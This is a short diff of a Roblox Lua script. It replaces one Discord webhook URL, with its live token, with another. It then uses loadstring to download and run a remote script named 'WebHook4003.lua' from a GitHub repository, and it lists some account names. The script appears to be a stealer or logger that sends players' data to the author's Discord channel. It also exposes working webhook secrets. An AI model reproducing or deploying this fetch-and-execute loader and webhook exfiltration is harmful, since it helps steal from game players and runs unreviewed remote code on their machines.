@@ -1,4 +1,4 @@
-getgenv().WebhookHere = "https://discord.com/api/webhooks/1073723064862380142/h5ViDrTwSVRo0QAhQLur_D64PyesbP6xCSfLrB1y_iNPcLJ2g9h-W0cph2U1fCjau9hk"
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1073748560690032650/GZg7qq0ym4nbAuqQSuBHdh8cq_VpIpu3E-mDIlsAtaGQ5ANJQGPxrg_jo6Jbiifxwr-b"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 local listed = {
     473129714 and "Void_87", -- Voids accounts
